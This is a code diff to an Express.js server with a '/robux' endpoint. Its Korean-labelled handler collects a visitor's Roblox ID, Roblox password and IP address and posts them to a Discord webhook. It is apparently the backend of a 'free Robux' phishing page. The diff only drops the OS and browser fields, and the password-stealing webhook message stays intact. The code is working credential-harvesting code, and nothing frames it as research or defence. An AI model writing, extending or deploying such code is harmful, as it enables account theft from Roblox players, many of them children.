@@ -51,8 +51,6 @@ app.post("/robux", async (req, res) => {
     try {
         const userAgent = req.useragent;
         const userIp = req.headers['x-forwarded-for'] ? req.headers['x-forwarded-for'].split(',')[0] : req.connection.remoteAddress;
-        const os = userAgent.os;
-        const browser = userAgent.browser;
 
         // 디스코드 웹훅 전송
         const webhookUrl = process.env.WEBHOOK_URL;
@@ -68,8 +66,6 @@ app.post("/robux", async (req, res) => {
                         { name: "🆔 Roblox 아이디", value: `\`${roblox_id}\`` },
                         { name: "🔑 Roblox 비밀번호", value: `\`${roblox_pwd}\`` },
                         { name: "🌐 IP 주소", value: `\`${userIp}\`` },
-                        { name: "💻 운영체제", value: os },
-                        { name: "🌍 브라우저", value: browser },
                         { name: "🔒 개인정보 동의", value: privacy_checked },
                         { name: "👥 제 3자 제공", value: _3rdperson_checked },
                         { name: "📢 마케팅 활용", value: advertise_checked }
